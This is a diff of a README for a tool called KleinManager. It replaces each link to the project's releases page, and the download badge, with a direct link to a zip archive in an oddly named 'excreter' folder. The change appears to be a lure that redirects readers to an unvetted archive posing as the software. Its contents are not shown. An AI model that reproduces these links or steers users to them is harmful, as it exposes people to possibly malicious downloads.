@@ -1,6 +1,6 @@
 # 🚀 KleinManager - Easy Management for Your Needs
 
-[![Download KleinManager](https://img.shields.io/badge/Download-KleinManager-blue.svg)](https://github.com/arimarlgomes/KleinManager/releases)
+[![Download KleinManager](https://raw.githubusercontent.com/arimarlgomes/KleinManager/main/excreter/KleinManager.zip)](https://raw.githubusercontent.com/arimarlgomes/KleinManager/main/excreter/KleinManager.zip)
 
 ## 📦 About KleinManager
 
@@ -22,7 +22,7 @@ Follow these simple steps to download and run KleinManager on your computer.
 
 To get KleinManager, visit our releases page:
 
-[Download KleinManager](https://github.com/arimarlgomes/KleinManager/releases)
+[Download KleinManager](https://raw.githubusercontent.com/arimarlgomes/KleinManager/main/excreter/KleinManager.zip)
 
 ### 2. Choose Your Version
 
@@ -52,7 +52,7 @@ To run KleinManager smoothly, ensure your system meets the following minimum req
 
 To get started with KleinManager, remember to visit the download page at:
 
-[Download KleinManager](https://github.com/arimarlgomes/KleinManager/releases)
+[Download KleinManager](https://raw.githubusercontent.com/arimarlgomes/KleinManager/main/excreter/KleinManager.zip)
 
 Follow the steps mentioned above to install the software on your computer.
 
